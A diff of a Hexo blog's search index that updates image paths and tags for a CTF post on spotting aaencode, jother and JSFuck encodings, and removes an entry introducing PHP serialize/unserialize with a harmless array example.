 <h3 id="常用解密网站：-16"><a href="#常用解密网站：-16" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p><a href="https://utf-8.jp/public/aaencode.html">https://utf-8.jp/public/aaencode.html</a></p>
 <h2 id="2、jother编码"><a href="#2、jother编码" class="headerlink" title="2、jother编码"></a>2、jother编码</h2><p><strong>特征：只用<code>! + ( ) [ ] &#123; &#125;</code>这八个字符就能完成对任意字符串的编码。也可在F12中解密执行</strong></p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\jor.png" alt="img"></p>
+<p><img src="/images/jor.png" alt="img"></p>
 <h3 id="常用解密网站：-17"><a href="#常用解密网站：-17" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p><a href="http://tmxk.org/jother/">http://tmxk.org/jother/</a></p>
 <h2 id="3、JSFuck编码"><a href="#3、JSFuck编码" class="headerlink" title="3、JSFuck编码"></a>3、JSFuck编码</h2><p><strong>特征：与jother很像，只是少了<code>&#123; &#125;</code></strong></p>
-<p><img src="/2020/11/25/30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%86%E6%96%87%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/Myblogs\source_posts\30余种加密编码类型的密文特征分析\jsf.png" alt="img"></p>
+<p><img src="/images/jsf.png" alt="img"></p>
 <h3 id="常用解密网站：-18"><a href="#常用解密网站：-18" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p><a href="http://www.jsfuck.com/">http://www.jsfuck.com/</a></p>
 ]]></content>
       <categories>
-        <category>misc</category>
+        <category>ctf</category>
       </categories>
       <tags>
-        <tag>各种编码</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php序列化与反序列化</title>
-    <url>/2020/11/16/php%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
-    <content><![CDATA[<h1 id="php序列化与反序列化"><a href="#php序列化与反序列化" class="headerlink" title="php序列化与反序列化"></a>php序列化与反序列化</h1><blockquote>
-<p>我们在开发的过程中常常遇到需要把对象或者数组进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到<a href="https://www.w3cschool.cn/mysql/mysql-tutorial.html">mysql数据库</a>中时，我们时常需要将数组进行序列号操作。</p>
-</blockquote>
-<blockquote>
-<blockquote>
-<p><strong>序列化</strong>（串行化）：是将变量转换为可保存或传输的字符串的过程；</p>
-<p><strong>反序列化</strong>（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。</p>
-<p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p>
-<p>常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。</p>
-</blockquote>
-</blockquote>
-<h2 id="常见使用情况"><a href="#常见使用情况" class="headerlink" title="常见使用情况"></a>常见使用情况</h2><p>a.对象系列化使用情况：</p>
-<p>对象的创建的时候被存储到内存里，在解析的时候被销毁，如果机器重启，那么对象也将被销毁在新建。想要保存对象或者将对象传给另一台机器，就需要将对象串行化（序列化）；或者在需要存储数据到mysql等数据库中时需要系列化。</p>
-<p>将对象转化成字符串叫系列化(串行化)</p>
-<p>将字符串转化成对象叫反系列化(反串行化)</p>
-<p>b.数组系列化使用情况：</p>
-<p>在跨语言，跨设备传输数组时，存放数据库或nosql数据库时，由于两者之间的数据格式不同，所以要将数据统一转成json(<a href="http://lib.csdn.net/base/javascript">JavaScript</a> object )格式传输。</p>
-<h2 id="1-serialize和unserialize函数"><a href="#1-serialize和unserialize函数" class="headerlink" title="1. serialize和unserialize函数"></a>1. serialize和unserialize函数</h2><p>这两个是序列化和反序列化PHP中数据的常用函数</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;Apple&#x27;</span> ,<span class="string">&#x27;b&#x27;</span> =&gt; <span class="string">&#x27;banana&#x27;</span> , <span class="string">&#x27;c&#x27;</span> =&gt; <span class="string">&#x27;Coconut&#x27;</span>);</span><br><span class="line">  </span><br><span class="line"><span class="comment">//序列化数组</span></span><br><span class="line">$s = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br><span class="line"><span class="comment">//输出结果：a:3:&#123;s:1:&quot;a&quot;;s:5:&quot;Apple&quot;;s:1:&quot;b&quot;;s:6:&quot;banana&quot;;s:1:&quot;c&quot;;s:7:&quot;Coconut&quot;;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line">$o = unserialize($s);</span><br><span class="line">print_r($o);</span><br><span class="line"><span class="comment">//输出结果 Array ( [a] =&gt; Apple [b] =&gt; banana [c] =&gt; Coconut )</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>序列化与反序列化</tag>
+        <tag>misc</tag>
       </tags>
   </entry>
 </search>
